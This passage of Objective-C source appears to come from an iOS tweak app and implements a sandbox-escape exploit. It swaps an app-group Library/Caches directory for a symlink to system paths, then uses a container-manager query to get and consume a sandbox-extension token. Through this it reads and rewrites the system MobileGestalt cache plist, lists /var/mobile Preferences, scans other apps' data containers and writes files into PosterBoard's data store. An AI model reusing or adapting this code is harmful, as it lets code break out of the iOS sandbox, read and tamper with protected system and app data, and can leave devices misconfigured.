            run_case(@"symLib p3 f800", 7, group, 3, @"", 0x800000000ULL, 0, YES, YES);
            bq_restore_path(lib, libBak);
        }

        // B: replace only Library/Caches with a symlink to MG Caches
        NSString *caches = [lib stringByAppendingPathComponent:@"Caches"];
        NSString *cachesBak = [lib stringByAppendingPathComponent:@"Caches.bq_orig"];
        if (bq_swap_path(caches, mgCaches, cachesBak)) {
            run_case(@"symCaches p3 f8100", 7, group, 3, @"", 0x8100000000ULL, 0, YES, YES);
            run_case(@"symCaches p3 f800", 7, group, 3, @"", 0x800000000ULL, 0, YES, YES);
            bq_restore_path(caches, cachesBak);
        }

        // class-12 geod lookup
        run_case(@"geod c12 p0 f900", 12, @"com.apple.geod", 0, @"", 0x900000000ULL, 1, NO, NO);
        run_case(@"geod c12 p3 f8100", 12, @"com.apple.geod", 3, @"", 0x8100000000ULL, 1, NO, NO);

        // class-13 MG control
        run_case(@"c13 mg p3 f8100", 13, @"systemgroup.com.apple.mobilegestaltcache", 3, @"", 0x8100000000ULL, 0, NO, YES);

        bqlog(@"================ PROBE_DONE ================");
    }
}

// ===================== v6: part-directory symlink probe ====================
static void bq_recover_path(NSString *path, NSString *backup) {
    NSFileManager *fm = [NSFileManager defaultManager];
    if (![fm fileExistsAtPath:backup]) return;
    [fm removeItemAtPath:path error:nil];
    NSError *e = nil;
    BOOL ok = [fm moveItemAtPath:backup toPath:path error:&e];
    bqlog(@"recover: %@ -> %@ ok=%d err=%@", backup, path, ok, e);
}

void BQRunProbeV6(void) {
    @autoreleasepool {
        if (!gLogPath) {
            gLogPath = [[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject]
                        stringByAppendingPathComponent:@"bq272.log"];
        }
        if (!gLock) gLock = [NSLock new];
        [[NSFileManager defaultManager] createFileAtPath:gLogPath contents:nil attributes:nil];

        bqlog(@"================ BQ272 v6 part-dir symlink probe ================");
        bqlog(@"date=%@ uid=%d bundle=%@", [NSDate date], getuid(), [NSBundle mainBundle].bundleIdentifier);
        load_mcm();

        NSString *group = @"group.8e0bc870a21520b9.1";
        NSURL *groupURL = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:group];
        NSString *groot = groupURL.path;
        NSString *mgLib = @"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library";
        NSString *mgCaches = [mgLib stringByAppendingPathComponent:@"Caches"];
        NSString *mgPrefs = [mgLib stringByAppendingPathComponent:@"Preferences"];
        bqlog(@"group=%@", groupURL);

        NSString *lib = [groot stringByAppendingPathComponent:@"Library"];
        NSString *libBak = [groot stringByAppendingPathComponent:@"Library.bq_orig"];
        bq_recover_path(lib, libBak);
        NSString *caches = [lib stringByAppendingPathComponent:@"Caches"];
        NSString *cachesBak = [lib stringByAppendingPathComponent:@"Caches.bq_orig"];
        bq_recover_path(caches, cachesBak);
        [[NSFileManager defaultManager] createDirectoryAtPath:caches withIntermediateDirectories:YES attributes:nil error:nil];

        // Map part numbers to paths (bit 32 = includePath, no extension).
        for (uint64_t p = 0; p <= 6; p++) {
            run_case([NSString stringWithFormat:@"map-p%llu", p],
                     7, group, p, @"", 0x100000000ULL, 0, NO, NO);
        }

        // Replace Library/Caches with a symlink to the MobileGestalt Caches.
        if (bq_swap_path(caches, mgCaches, cachesBak)) {
            run_case(@"symCaches-p3-f8100", 7, group, 3, @"", 0x8100000000ULL, 0, YES, YES);
            bq_restore_path(caches, cachesBak);
        } else {
            bq_recover_path(caches, cachesBak);
        }

        // Replace Library/Preferences with a symlink to MobileGestalt Preferences.
        NSString *prefs = [lib stringByAppendingPathComponent:@"Preferences"];
        NSString *prefsBak = [lib stringByAppendingPathComponent:@"Preferences.bq_orig"];
        bq_recover_path(prefs, prefsBak);
        if (bq_swap_path(prefs, mgPrefs, prefsBak)) {
            run_case(@"symPrefs-p4-f8100", 7, group, 4, @"", 0x8100000000ULL, 0, YES, YES);
            run_case(@"symPrefs-p4-f900", 7, group, 4, @"", 0x900000000ULL, 0, YES, YES);
            bq_restore_path(prefs, prefsBak);
        } else {
            bq_recover_path(prefs, prefsBak);
        }

        // Is the app-group root writable for symlinks at all?
        NSString *rootLink = [groot stringByAppendingPathComponent:@"rootlink_test"];
        unlink(rootLink.fileSystemRepresentation);
        errno = 0;
        int rr = symlink(mgCaches.fileSystemRepresentation, rootLink.fileSystemRepresentation);
        bqlog(@"root symlink test ret=%d errno=%d", rr, errno);
        if (rr == 0) unlink(rootLink.fileSystemRepresentation);

        bqlog(@"================ PROBE_DONE ================");
    }
}

// ===================== v7: Caches symlink, minimal ==========================
void BQRunProbeV7(void) {
    @autoreleasepool {
        if (!gLogPath) {
            gLogPath = [[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject]
                        stringByAppendingPathComponent:@"bq272.log"];
        }
        if (!gLock) gLock = [NSLock new];
        [[NSFileManager defaultManager] createFileAtPath:gLogPath contents:nil attributes:nil];

        bqlog(@"================ BQ272 v7 Caches-symlink probe ================");
        bqlog(@"date=%@ uid=%d bundle=%@", [NSDate date], getuid(), [NSBundle mainBundle].bundleIdentifier);
        load_mcm();

        NSString *group = @"group.8e0bc870a21520b9.1";
        NSURL *groupURL = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:group];
        NSString *groot = groupURL.path;
        NSString *mgLib = @"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library";
        NSString *mgCaches = [mgLib stringByAppendingPathComponent:@"Caches"];
        bqlog(@"group=%@", groupURL);
        bqlog(@"mgCaches=%@", mgCaches);

        NSString *lib = [groot stringByAppendingPathComponent:@"Library"];
        NSString *libBak = [groot stringByAppendingPathComponent:@"Library.bq_orig"];
        bq_recover_path(lib, libBak);
        NSString *caches = [lib stringByAppendingPathComponent:@"Caches"];
        NSString *cachesBak = [lib stringByAppendingPathComponent:@"Caches.bq_orig"];
        bq_recover_path(caches, cachesBak);
        [[NSFileManager defaultManager] createDirectoryAtPath:caches withIntermediateDirectories:YES attributes:nil error:nil];

        // Is symlink() allowed in Library at all?
        NSString *probeLink = [lib stringByAppendingPathComponent:@"symlink_probe"];
        unlink(probeLink.fileSystemRepresentation);
        errno = 0;
        int sr = symlink(mgCaches.fileSystemRepresentation, probeLink.fileSystemRepresentation);
        int se = errno;
        bqlog(@"symlink probe in Library ret=%d errno=%d (%s)", sr, se, strerror(se));
        if (sr == 0) unlink(probeLink.fileSystemRepresentation);

        // Swap Library/Caches for a symlink to MobileGestalt Caches.
        if (bq_swap_path(caches, mgCaches, cachesBak)) {
            run_case(@"symCaches-p3-f8100", 7, group, 3, @"", 0x8100000000ULL, 0, YES, YES);
            bq_restore_path(caches, cachesBak);
        } else {
            bq_recover_path(caches, cachesBak);
        }

        bqlog(@"================ PROBE_DONE ================");
    }
}

// ===================== v8: general escape proofs ===========================
static NSString *find_app_container(NSString *bundleID) {
    Class wsClass = NSClassFromString(@"LSApplicationWorkspace");
    if (!wsClass) { bqlog(@"LSApplicationWorkspace missing"); return nil; }
    id ws = ((id (*)(id, SEL))objc_msgSend)(wsClass, @selector(defaultWorkspace));
    if (!ws) { bqlog(@"defaultWorkspace nil"); return nil; }
    NSArray *apps = ((id (*)(id, SEL))objc_msgSend)(ws, @selector(allApplications));
    bqlog(@"LS allApplications count=%lu", (unsigned long)apps.count);
    for (id app in apps) {
        NSString *aid = ((id (*)(id, SEL))objc_msgSend)(app, @selector(applicationIdentifier));
        if (![aid isEqualToString:bundleID]) continue;
        SEL sel = @selector(dataContainerURL);
        if (![app respondsToSelector:sel]) { bqlog(@"%@ has no dataContainerURL", bundleID); return nil; }
        NSURL *u = ((id (*)(id, SEL))objc_msgSend)(app, sel);
        bqlog(@"found %@ dataContainerURL=%@", bundleID, u);
        return u.path;
    }
    bqlog(@"%@ not found in LS", bundleID);
    return nil;
}

static void marker_at(NSString *dir, NSString *label) {
    NSString *leaf = [NSString stringWithFormat:@".bq272_%d", getpid()];
    NSString *p = [dir stringByAppendingPathComponent:leaf];
    errno = 0;
    int fd = open(p.fileSystemRepresentation, O_WRONLY | O_CREAT | O_EXCL | O_CLOEXEC, 0600);
    int e = errno;
    bqlog(@"marker[%@] open=%d errno=%d (%s)", label, fd, e, strerror(e));
    if (fd >= 0) {
        ssize_t w = write(fd, "ok\n", 3);
        fsync(fd);
        close(fd);
        errno = 0;
        int ur = unlink(p.fileSystemRepresentation);
        bqlog(@"marker[%@] write=%zd unlink=%d errno=%d", label, w, ur, errno);
    }
}

static int64_t escape_to(NSString *group, NSString *groot, NSString *target,
                         NSString *label, NSString **linkOut) {
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *lib = [groot stringByAppendingPathComponent:@"Library"];
    NSString *caches = [lib stringByAppendingPathComponent:@"Caches"];
    NSString *bak = [lib stringByAppendingPathComponent:@"Caches.bq_cur"];
    bq_recover_path(lib, [groot stringByAppendingPathComponent:@"Library.bq_orig"]);
    bq_recover_path(caches, bak);
    [fm createDirectoryAtPath:lib withIntermediateDirectories:YES attributes:nil error:nil];

    bqlog(@"escape[%@]: target=%@", label, target);
    if (!bq_swap_path(caches, target, bak)) {
        bq_recover_path(caches, bak);
        return -2;
    }

    void *q = g.create();
    if (!q) { bq_restore_path(caches, bak); return -3; }
    g.set_class(q, 7);
    xpc_object_t ident = p_xpc_string_create ? p_xpc_string_create(group.UTF8String) : NULL;
    if (g.set_group_ids) g.set_group_ids(q, ident);
    if (g.set_part) g.set_part(q, 3);
    if (g.set_flags) g.set_flags(q, 0x8100000000ULL);
    if (ident && p_xpc_release) p_xpc_release(ident);

    void *res = g.get_one(q);
    bqlog(@"escape[%@]: result=%p", label, res);
    if (!res) {
        log_last_error(q, @"escape");
        g.query_free(q);
        bq_restore_path(caches, bak);
        return -4;
    }
    char *tok = g.copy_token ? g.copy_token(res) : NULL;
    int64_t h = (tok && g.consume) ? g.consume(tok) : -5;
    bqlog(@"escape[%@]: token=%s consume=%lld", label, tok ? "YES" : "NO", (long long)h);
    if (tok) free(tok);
    g.query_free(q);
    if (h < 0) {
        bq_restore_path(caches, bak);
        return h;
    }
    if (linkOut) *linkOut = caches;
    return h;
}

static void escape_done(NSString *groot, int64_t h, NSString *label) {
    if (h >= 0 && g.release) g.release(h);
    NSString *lib = [groot stringByAppendingPathComponent:@"Library"];
    NSString *caches = [lib stringByAppendingPathComponent:@"Caches"];
    NSString *bak = [lib stringByAppendingPathComponent:@"Caches.bq_cur"];
    bq_restore_path(caches, bak);
    bqlog(@"escape[%@]: release handle + restore Caches", label);
}

void BQRunProbeV8(void) {
    @autoreleasepool {
        if (!gLogPath) {
            gLogPath = [[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject]
                        stringByAppendingPathComponent:@"bq272.log"];
        }
        if (!gLock) gLock = [NSLock new];
        [[NSFileManager defaultManager] createFileAtPath:gLogPath contents:nil attributes:nil];

        bqlog(@"================ BQ272 v8 escape proofs ================");
        bqlog(@"date=%@ uid=%d bundle=%@", [NSDate date], getuid(), [NSBundle mainBundle].bundleIdentifier);
        load_mcm();

        NSString *group = @"group.8e0bc870a21520b9.1";
        NSURL *groupURL = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:group];
        NSString *groot = groupURL.path;
        NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
        NSString *mgDir = @"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches";
        bqlog(@"group=%@", groupURL);

        // 1) MobileGestalt
        NSString *link = nil;
        int64_t h = escape_to(group, groot, mgDir, @"mg", &link);
        if (h >= 0) {
            NSString *plist = [link stringByAppendingPathComponent:@"com.apple.MobileGestalt.plist"];
            NSData *d = [NSData dataWithContentsOfFile:plist];
            bqlog(@"MG plist read bytes=%lu", (unsigned long)d.length);
            NSError *e = nil;
            id pl = [NSPropertyListSerialization propertyListWithData:d options:0 format:NULL error:&e];
            bqlog(@"MG plist parse class=%@ err=%@", pl ? NSStringFromClass([pl class]) : @"nil", e);
            if (d.length) [d writeToFile:[docs stringByAppendingPathComponent:@"MobileGestalt.backup.plist"] atomically:YES];
            errno = 0;
            int fd = open(plist.fileSystemRepresentation, O_RDWR | O_CLOEXEC);
            bqlog(@"MG plist O_RDWR=%d errno=%d (%s)", fd, errno, strerror(errno));
            if (fd >= 0) close(fd);
            marker_at(link, @"mg-dir");
            escape_done(groot, h, @"mg");
        }

        // 2) /var/mobile/Library/Preferences
        h = escape_to(group, groot, @"/var/mobile/Library/Preferences", @"prefs", &link);
        if (h >= 0) {
            marker_at(link, @"prefs");
            list_dir(link, 15);
            escape_done(groot, h, @"prefs");
        }

        // 3) PosterBoard app data container
        NSString *pb = find_app_container(@"com.apple.PosterBoard");
        bqlog(@"PosterBoard container=%@", pb);
        if (pb.length) {
            h = escape_to(group, groot, pb, @"posterboard", &link);
            if (h >= 0) {
                list_dir(link, 20);
                NSArray *rels = @[
                    @"Library/Application Support/PRBPosterExtensionDataStore/61/Extensions/com.apple.WallpaperKit.CollectionsPoster/descriptors",
                    @"Library/Application Support/PRBPosterExtensionDataStore/61/Extensions/com.apple.MercuryPoster/descriptors",
                    @"Library/Application Support/PRBPosterExtensionDataStore/61/Extensions/com.apple.PhotosUIPrivate.PhotosPosterProvider/descriptors",
                    @"Library/Application Support/PosterBoard/Collections",
                ];
                for (NSString *rel in rels) {
                    NSString *p = [link stringByAppendingPathComponent:rel];
                    struct stat st;
                    memset(&st, 0, sizeof(st));
                    errno = 0;
                    int sr = stat(p.fileSystemRepresentation, &st);
                    bqlog(@"PB rel=%@ stat=%d errno=%d type=%s", rel, sr, errno,
                          sr == 0 ? (S_ISDIR(st.st_mode) ? "dir" : "other") : "-");
                    if (sr == 0 && S_ISDIR(st.st_mode)) {
                        list_dir(p, 12);
                        marker_at(p, rel);
                    }
                }
                escape_done(groot, h, @"posterboard");
            }
        }

        bqlog(@"================ PROBE_DONE ================");
    }
}

// ===================== v9: find PosterBoard container ======================
static NSString *ls_proxy_container(NSString *bid) {
    dlopen("/System/Library/Frameworks/MobileCoreServices.framework/MobileCoreServices", RTLD_NOW);
    dlopen("/System/Library/PrivateFrameworks/LaunchServices.framework/LaunchServices", RTLD_NOW);
    Class c = NSClassFromString(@"LSApplicationProxy");
    if (!c) { bqlog(@"LSApplicationProxy class missing"); return nil; }
    SEL s = @selector(applicationProxyForIdentifier:);
    if (![c respondsToSelector:s]) { bqlog(@"applicationProxyForIdentifier: missing"); return nil; }
    id app = ((id (*)(id, SEL, id))objc_msgSend)(c, s, bid);
    bqlog(@"LSApplicationProxy(%@)=%@", bid, app);
    if (!app) return nil;
    SEL d = @selector(dataContainerURL);
    if (![app respondsToSelector:d]) { bqlog(@"dataContainerURL missing"); return nil; }
    NSURL *u = ((id (*)(id, SEL))objc_msgSend)(app, d);
    bqlog(@"LS dataContainerURL=%@", u);
    return u.path;
}

static NSString *find_pb_by_enum(NSString *group, NSString *groot) {
    char *lst = bq_list("/var/mobile/Containers/Data/Application", 400000);
    if (!lst) { bqlog(@"enum: bq_list NULL"); return nil; }
    NSString *s = [NSString stringWithUTF8String:lst];
    free(lst);
    NSArray *lines = [s componentsSeparatedByString:@"\n"];
    bqlog(@"enum: %lu containers", (unsigned long)lines.count);
    int n = 0;
    NSString *found = nil;
    for (NSString *line in lines) {
        if (!line.length) continue;
        if (++n > 400) { bqlog(@"enum: limit reached"); break; }
        NSString *link = nil;
        int64_t h = escape_to(group, groot, line, @"enum", &link);
        if (h < 0) {
            if (n <= 3) bqlog(@"enum[%d] %@: escape failed %lld", n, line.lastPathComponent, (long long)h);
            continue;
        }
        NSString *mp = [link stringByAppendingPathComponent:@".com.apple.mobile_container_manager.metadata.plist"];
        NSDictionary *md = [NSDictionary dictionaryWithContentsOfFile:mp];
        NSString *bid = md[@"MCMMetadataIdentifier"];
        if (bid) {
            if (n <= 5 || [bid isEqualToString:@"com.apple.PosterBoard"]) {
                bqlog(@"enum[%d] %@ -> %@", n, line.lastPathComponent, bid);
            }
            if ([bid isEqualToString:@"com.apple.PosterBoard"]) found = line;
        } else if (n <= 3) {
            bqlog(@"enum[%d] %@ metadata unreadable", n, line.lastPathComponent);
        }
        escape_done(groot, h, @"enum");
        if (found) break;
    }
    return found;
}

void BQRunProbeV9(void) {
    @autoreleasepool {
        if (!gLogPath) {
            gLogPath = [[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject]
                        stringByAppendingPathComponent:@"bq272.log"];
        }
        if (!gLock) gLock = [NSLock new];
        [[NSFileManager defaultManager] createFileAtPath:gLogPath contents:nil attributes:nil];

        bqlog(@"================ BQ272 v9 PosterBoard finder ================");
        bqlog(@"date=%@ uid=%d", [NSDate date], getuid());
        load_mcm();

        NSString *group = @"group.8e0bc870a21520b9.1";
        NSURL *groupURL = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:group];
        NSString *groot = groupURL.path;
        bqlog(@"group=%@", groupURL);

        NSString *pb = ls_proxy_container(@"com.apple.PosterBoard");
        if (!pb.length) {
            // class-2 query for the bundle id with modifiers (path-only)
            int mods[][3] = {{-1,-1,0},{0,-1,0},{-1,1,0},{-1,-1,1},{0,1,1}};
            for (int m = 0; m < 5; m++) {
                gModUid = mods[m][0]; gModPlatform = mods[m][1]; gModOther = mods[m][2];
                run_case([NSString stringWithFormat:@"ls-c2-mod%d", m],
                         2, @"com.apple.PosterBoard", 0, @"", 0x100000000ULL, 1, NO, NO);
                run_case([NSString stringWithFormat:@"ls-c2-p3-mod%d", m],
                         2, @"com.apple.PosterBoard", 3, @"", 0x100000000ULL, 1, NO, NO);
            }
            gModUid = -1; gModPlatform = -1; gModOther = 0;
        }
        if (!pb.length) pb = find_pb_by_enum(group, groot);
        bqlog(@"PosterBoard container=%@", pb);

        if (pb.length) {
            NSString *link = nil;
            int64_t h = escape_to(group, groot, pb, @"pb", &link);
            if (h >= 0) {
                list_dir(link, 20);
                NSArray *rels = @[
                    @"Library/Application Support/PRBPosterExtensionDataStore/61/Extensions/com.apple.WallpaperKit.CollectionsPoster/descriptors",
                    @"Library/Application Support/PRBPosterExtensionDataStore/61/Extensions/com.apple.MercuryPoster/descriptors",
                    @"Library/Application Support/PRBPosterExtensionDataStore/61/Extensions/com.apple.PhotosUIPrivate.PhotosPosterProvider/descriptors",
                    @"Library/Application Support/PosterBoard/Collections",
                ];
                for (NSString *rel in rels) {
                    NSString *p = [link stringByAppendingPathComponent:rel];
                    struct stat st;
                    memset(&st, 0, sizeof(st));
                    errno = 0;
                    int sr = stat(p.fileSystemRepresentation, &st);
                    bqlog(@"PB rel=%@ stat=%d errno=%d type=%s", rel, sr, errno,
                          sr == 0 ? (S_ISDIR(st.st_mode) ? "dir" : "other") : "-");
                    if (sr == 0 && S_ISDIR(st.st_mode)) {
                        list_dir(p, 12);
                        marker_at(p, rel);
                    }
                }
                escape_done(groot, h, @"pb");
            }
        }

        bqlog(@"================ PROBE_DONE ================");
    }
}

// ===================== v10: scan containers for PRB data ===================
void BQRunProbeV10(void) {
    @autoreleasepool {
        if (!gLogPath) {
            gLogPath = [[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject]
                        stringByAppendingPathComponent:@"bq272.log"];
        }
        if (!gLock) gLock = [NSLock new];
        [[NSFileManager defaultManager] createFileAtPath:gLogPath contents:nil attributes:nil];

        bqlog(@"================ BQ272 v10 PRB scan ================");
        bqlog(@"date=%@ uid=%d", [NSDate date], getuid());
        load_mcm();

        NSString *group = @"group.8e0bc870a21520b9.1";
        NSURL *groupURL = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:group];
        NSString *groot = groupURL.path;
        bqlog(@"group=%@", groupURL);

        char *lst = bq_list("/var/mobile/Containers/Data/Application", 400000);
        NSString *found = nil;
        if (!lst) {
            bqlog(@"bq_list NULL");
        } else {
            NSString *s = [NSString stringWithUTF8String:lst];
            free(lst);
            NSArray *lines = [s componentsSeparatedByString:@"\n"];
            bqlog(@"containers=%lu", (unsigned long)lines.count);
            int n = 0;
            for (NSString *line in lines) {
                if (!line.length) continue;
                if (++n > 400) break;
                NSString *link = nil;
                int64_t h = escape_to(group, groot, line, @"prbscan", &link);
                if (h < 0) continue;
                NSArray *rels = @[
                    @"Library/Application Support/PRBPosterExtensionDataStore",
                    @"Library/Application Support/PosterBoard",
                    @"Library/Application Support/PRBPosterExtensionDataStore/61",
                ];
                for (NSString *rel in rels) {
                    NSString *p = [link stringByAppendingPathComponent:rel];
                    struct stat st;
                    memset(&st, 0, sizeof(st));
                    errno = 0;
                    int sr = stat(p.fileSystemRepresentation, &st);
                    if (sr == 0) {
                        bqlog(@"FOUND %@ in %@ (n=%d)", rel, line.lastPathComponent, n);
                        found = line;
                        break;
                    }
                }
                if (n % 20 == 0) bqlog(@"scan n=%d at %@ found=%@", n, line.lastPathComponent, found ? @"YES" : @"no");
                escape_done(groot, h, @"prbscan");
                if (found) break;
            }
        }
        bqlog(@"PosterBoard container=%@", found);

        if (found.length) {
            NSString *link = nil;
            int64_t h = escape_to(group, groot, found, @"pbdata", &link);
            if (h >= 0) {
                list_dir([link stringByAppendingPathComponent:@"Library/Application Support"], 20);
                NSArray *rels = @[
                    @"Library/Application Support/PRBPosterExtensionDataStore/61/Extensions/com.apple.WallpaperKit.CollectionsPoster/descriptors",
                    @"Library/Application Support/PRBPosterExtensionDataStore/61/Extensions/com.apple.MercuryPoster/descriptors",
                    @"Library/Application Support/PRBPosterExtensionDataStore/61/Extensions/com.apple.PhotosUIPrivate.PhotosPosterProvider/descriptors",
                    @"Library/Application Support/PosterBoard/Collections",
                ];
                for (NSString *rel in rels) {
                    NSString *p = [link stringByAppendingPathComponent:rel];
                    struct stat st;
                    memset(&st, 0, sizeof(st));
                    errno = 0;
                    int sr = stat(p.fileSystemRepresentation, &st);
                    bqlog(@"PB rel=%@ stat=%d errno=%d type=%s", rel, sr, errno,
                          sr == 0 ? (S_ISDIR(st.st_mode) ? "dir" : "other") : "-");
                    if (sr == 0 && S_ISDIR(st.st_mode)) {
                        list_dir(p, 12);
                        marker_at(p, rel);
                    }
                }
                escape_done(groot, h, @"pbdata");
            }
        }

        bqlog(@"================ PROBE_DONE ================");
    }
}

// ===================== v11: final tool helpers =============================
static NSString *scan_pb_container(NSString *group, NSString *groot) {
    char *lst = bq_list("/var/mobile/Containers/Data/Application", 400000);
    if (!lst) { bqlog(@"scan: bq_list NULL"); return nil; }
    NSString *s = [NSString stringWithUTF8String:lst];
    free(lst);
    NSArray *lines = [s componentsSeparatedByString:@"\n"];
    bqlog(@"scan: %lu containers", (unsigned long)lines.count);
    int n = 0;
    NSString *found = nil;
    for (NSString *line in lines) {
        if (!line.length) continue;
        if (++n > 400) break;
        NSString *link = nil;
        int64_t h = escape_to(group, groot, line, @"scan", &link);
        if (h < 0) continue;
        NSArray *rels = @[
            @"Library/Application Support/PRBPosterExtensionDataStore",
            @"Library/Application Support/PosterBoard",
            @"Library/Application Support/PRBPosterExtensionDataStore/61",
        ];
        for (NSString *rel in rels) {
            struct stat st;
            memset(&st, 0, sizeof(st));
            if (stat([link stringByAppendingPathComponent:rel].fileSystemRepresentation, &st) == 0) {
                bqlog(@"scan: FOUND %@ in %@ (n=%d)", rel, line.lastPathComponent, n);
                found = line;
                break;
            }
        }
        if (n % 25 == 0) bqlog(@"scan: n=%d", n);
        escape_done(groot, h, @"scan");
        if (found) break;
    }
    return found;
}

static void randomize_ids(NSString *dir) {
    NSFileManager *fm = [NSFileManager defaultManager];
    NSDirectoryEnumerator *en = [fm enumeratorAtPath:dir];
    NSString *rel = nil;
    while ((rel = [en nextObject]) != nil) {
        NSString *name = rel.lastPathComponent;
        NSString *full = [dir stringByAppendingPathComponent:rel];
        if ([name isEqualToString:@"com.apple.posterkit.provider.descriptor.identifier"]) {
            NSString *v = [NSString stringWithFormat:@"%u", 10000 + arc4random_uniform(90000)];
            [v writeToFile:full atomically:YES encoding:NSUTF8StringEncoding error:nil];
        } else if ([name isEqualToString:@"com.apple.posterkit.provider.contents.userInfo"] ||
                   [name isEqualToString:@"Wallpaper.plist"]) {
            NSMutableDictionary *d = [NSMutableDictionary dictionaryWithContentsOfFile:full];
            if (d) {
                unsigned v = 10000 + arc4random_uniform(90000);
                if ([name isEqualToString:@"Wallpaper.plist"]) d[@"identifier"] = @(v);
                else d[@"wallpaperRepresentingIdentifier"] = @(v);
                [d writeToFile:full atomically:YES];
            }
        }
    }
}

static void copy_wallpapers(NSString *docs, NSString *link) {
    NSString *root = [docs stringByAppendingPathComponent:@"PosterBoard/Wallpapers"];
    NSFileManager *fm = [NSFileManager defaultManager];
    if (![fm fileExistsAtPath:root]) {
        bqlog(@"wallpapers: no source dir %@", root);
        return;
    }
    NSDictionary *providers = @{
        @"wpkit": @"Library/Application Support/PRBPosterExtensionDataStore/61/Extensions/com.apple.WallpaperKit.CollectionsPoster/descriptors",
        @"mercury": @"Library/Application Support/PRBPosterExtensionDataStore/61/Extensions/com.apple.MercuryPoster/descriptors",
        @"photos": @"Library/Application Support/PRBPosterExtensionDataStore/61/Extensions/com.apple.PhotosUIPrivate.PhotosPosterProvider/descriptors",
    };
    for (NSString *type in providers) {
        NSString *src = [root stringByAppendingPathComponent:type];
        if (![fm fileExistsAtPath:src]) continue;
        NSString *dst = [link stringByAppendingPathComponent:providers[type]];
        [fm createDirectoryAtPath:dst withIntermediateDirectories:YES attributes:nil error:nil];
        NSArray *items = [fm contentsOfDirectoryAtPath:src error:nil];
        bqlog(@"wallpapers[%@]: %lu items", type, (unsigned long)items.count);
        for (NSString *item in items) {
            if ([item hasPrefix:@"."]) continue;
            NSString *s = [src stringByAppendingPathComponent:item];
            NSString *d = [dst stringByAppendingPathComponent:item];
            [fm removeItemAtPath:d error:nil];
            NSError *e = nil;
            BOOL ok = [fm copyItemAtPath:s toPath:d error:&e];
            bqlog(@"wallpapers[%@]: %@ copy=%d err=%@", type, item, ok, e);
            if (ok && ![type isEqualToString:@"mercury"]) randomize_ids(d);
        }
    }
}

static void apply_mg(NSString *group, NSString *groot, NSString *docs) {
    NSString *mgDir = @"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches";
    NSString *link = nil;
    int64_t h = escape_to(group, groot, mgDir, @"mgapply", &link);
    if (h < 0) { bqlog(@"mg: escape failed %lld", (long long)h); return; }
    NSString *plist = [link stringByAppendingPathComponent:@"com.apple.MobileGestalt.plist"];
    NSString *backup = [docs stringByAppendingPathComponent:@"OriginalGestalt.plist"];
    NSData *orig = [NSData dataWithContentsOfFile:plist];
    bqlog(@"mg: read=%lu bytes", (unsigned long)orig.length);
    if (orig.length && ![[NSFileManager defaultManager] fileExistsAtPath:backup]) {
        [orig writeToFile:backup atomically:YES];
        bqlog(@"mg: backup -> %@", backup);
    }
    NSMutableDictionary *mg = [NSMutableDictionary dictionaryWithContentsOfFile:plist];
    if (!mg) {
        bqlog(@"mg: plist not readable as dictionary");
        escape_done(groot, h, @"mgapply");
        return;
    }
    bqlog(@"mg: top keys=%@", mg.allKeys);
    NSDictionary *ce = [mg[@"CacheExtra"] isKindOfClass:[NSDictionary class]] ? mg[@"CacheExtra"] : nil;
    bqlog(@"mg: CacheExtra keys=%lu", (unsigned long)ce.count);

    NSString *restoreMarker = [docs stringByAppendingPathComponent:@"RestoreGestalt"];
    if ([[NSFileManager defaultManager] fileExistsAtPath:restoreMarker] &&
        [[NSFileManager defaultManager] fileExistsAtPath:backup]) {
        NSData *b = [NSData dataWithContentsOfFile:backup];
        NSString *tmp = [link stringByAppendingPathComponent:@"com.apple.MobileGestalt.plist.bqtmp"];
        BOOL w = [b writeToFile:tmp atomically:NO];
        int fd = open(tmp.fileSystemRepresentation, O_RDONLY);
        if (fd >= 0) { fsync(fd); close(fd); }
        int rr = rename(tmp.fileSystemRepresentation, plist.fileSystemRepresentation);
        bqlog(@"mg: RESTORE bytes=%lu write=%d rename=%d errno=%d", (unsigned long)b.length, w, rr, errno);
    } else {
        NSString *cfgPath = [docs stringByAppendingPathComponent:@"MobileGestaltTweaks.plist"];
        NSDictionary *cfg = [NSDictionary dictionaryWithContentsOfFile:cfgPath];
        if (cfg) {
            NSMutableDictionary *mce = ce ? [ce mutableCopy] : [NSMutableDictionary dictionary];
            NSDictionary *nested = [cfg[@"CacheExtra"] isKindOfClass:[NSDictionary class]] ? cfg[@"CacheExtra"] : nil;
            NSDictionary *source = nested ?: cfg;
            int applied = 0, removed = 0;
            for (id key in source) {
                if ([key isEqualToString:@"CacheExtra"]) continue;
                id val = source[key];
                if ([val isKindOfClass:[NSString class]] && [val isEqualToString:@"__remove__"]) {
                    [mce removeObjectForKey:key]; removed++;
                } else {
                    mce[key] = val; applied++;
                }
            }
            mg[@"CacheExtra"] = mce;
            NSError *e = nil;
            NSData *data = [NSPropertyListSerialization dataWithPropertyList:mg
                                format:NSPropertyListBinaryFormat_v1_0 options:0 error:&e];
            if (data.length) {
                NSString *tmp = [link stringByAppendingPathComponent:@"com.apple.MobileGestalt.plist.bqtmp"];
                BOOL w = [data writeToFile:tmp atomically:NO];
                int fd = open(tmp.fileSystemRepresentation, O_RDONLY);
                if (fd >= 0) { fsync(fd); close(fd); }
                int rr = rename(tmp.fileSystemRepresentation, plist.fileSystemRepresentation);
                bqlog(@"mg: APPLY set=%d removed=%d bytes=%lu write=%d rename=%d errno=%d",
                      applied, removed, (unsigned long)data.length, w, rr, errno);
            } else {
                bqlog(@"mg: serialize failed %@", e);
            }
        } else {
